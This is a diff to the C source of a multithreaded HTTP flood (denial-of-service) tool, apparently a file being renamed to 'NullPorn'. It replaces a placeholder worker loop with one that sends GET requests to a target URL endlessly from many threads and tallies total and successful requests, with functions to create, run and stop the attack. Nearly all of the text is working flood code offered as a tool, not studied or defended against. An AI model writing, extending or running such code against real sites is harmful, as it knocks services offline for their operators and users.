@@ -1,23 +1,31 @@
-#include "DDoS.h"
+#include "NullPorn.h"
 
-static bool stop = false;
+static AttackData s_AttackData = {
+    .stop = false,
+    .totalRequests = 0,
+    .successfulRequests = 0,
+};
 
 static void* WorkerThread(void* data)
 {
-    AttackData* attackData = (AttackData*) data;
+    WorkerData* workerData = (WorkerData*) data;
 
-    while (!stop);
-        printf("[%d]: Attacking.\n", attackData->workerIndex);
-    printf("[%d]: Done.\n", attackData->workerIndex);
+    while (!s_AttackData.stop)
+    {
+        if (HTTPGetRequest(workerData->url))
+            s_AttackData.successfulRequests++;
+        s_AttackData.totalRequests++;
+    }
 }
 
 void CreateAttack(DDoS* ddos, char* url, uint32_t workersCount)
 {
     ddos->url          = url;
-    ddos->workersCount = workersCount;
+    ddos->data         = &s_AttackData;
 
-    ddos->workers = (pthread_t*) malloc(sizeof(pthread_t)*workersCount);
-    ddos->workersData = (AttackData*) malloc(sizeof(AttackData)*workersCount);
+    ddos->workers      = (pthread_t*)  malloc(sizeof(pthread_t) *workersCount);
+    ddos->workersData  = (WorkerData*) malloc(sizeof(WorkerData)*workersCount);
+    ddos->workersCount = workersCount;
 }
 
 void RunAttack(DDoS* ddos)
@@ -33,7 +41,7 @@ void RunAttack(DDoS* ddos)
 
 void StopAttack(DDoS* ddos)
 {
-    stop = true;
+    s_AttackData.stop = true;
 
     for (int i = 0; i < ddos->workersCount; i++)
         pthread_join(ddos->workers[i], NULL);
